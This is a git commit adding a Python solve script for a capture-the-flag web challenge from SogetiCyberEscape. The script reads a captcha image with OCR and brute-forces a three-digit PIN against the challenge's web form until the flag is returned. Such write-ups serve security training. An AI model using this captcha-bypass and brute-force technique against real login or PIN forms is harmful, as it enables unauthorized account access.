74b45fa8d1ae4055c578ed6404bb85d7d087310a
zteeed <zteeed@minet.net>
2019-04-01 23:22:27 +0200

    Add crypto3 web captcha final challenge from SogetiCyberEscape

---
+++ writeup-scripts/2018-2019/SogetiCyberEscape/finals/web/captcha/solve.py
@@ -0,0 +1,51 @@
+#!/usr/bin/python3
+
+import base64, os, re, requests, pwn
+
+
+def compute_digit(s, p, p2, digit):
+    html = s.get(url).content
+    pattern = b'<img class="img-thumbnail" src="data:image/jpg;base64,(.*?)"'
+    b64_img = re.findall(pattern, html)
+    file = open('test.jpg', 'wb')
+    file.write(base64.b64decode(b64_img[0]))
+    file.close()
+    os.system('gocr -i ./test.jpg > res.txt')
+    f = open('./res.txt')
+    res = f.read()
+    f.close()
+    payload = {'cametu': str(res)[:-1]}
+    pin = "0"*(3-len(str(digit))) + str(digit)
+    data = dict(pin=pin, answer=str(res)[:-1])
+    p2.status(str(data))
+    rep = s.post(url, data=data)
+    p.status(rep.content.decode())
+    return rep
+
+
+def compute(s, p, p2):
+    digit = 0
+    while digit < 1000:
+        rep = compute_digit(s, p, p2, digit)
+        if rep.content == b'You might want to see the captcha before saying what it is !':
+            pass
+        elif rep.content == b'Invalid pin code':
+            digit += 1
+        elif rep.content == b'Bad captcha answer':
+            pass
+        else:
+            p.success(rep.content.decode())
+            return rep.content
+    return
+
+
+def solve(s):
+    with pwn.log.progress('reponse') as p:
+        with pwn.log.progress('payload') as p2:
+            flag = compute(s, p, p2)
+
+
+if __name__ == '__main__':
+    url = 'https://shadowpex.shadow-league.org/'
+    s = requests.session()
+    flag = solve(s)
